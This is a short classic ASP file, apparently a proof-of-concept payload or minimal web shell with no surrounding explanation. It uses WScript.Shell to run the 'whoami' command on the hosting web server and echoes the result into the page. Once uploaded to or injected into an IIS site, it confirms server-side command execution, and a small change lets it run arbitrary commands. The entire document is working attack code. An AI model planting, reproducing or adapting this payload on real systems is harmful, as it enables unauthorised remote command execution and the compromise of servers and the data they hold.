<%
Set rs = CreateObject("Wscript.Shell")
Set cmd = rs.Exec("whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
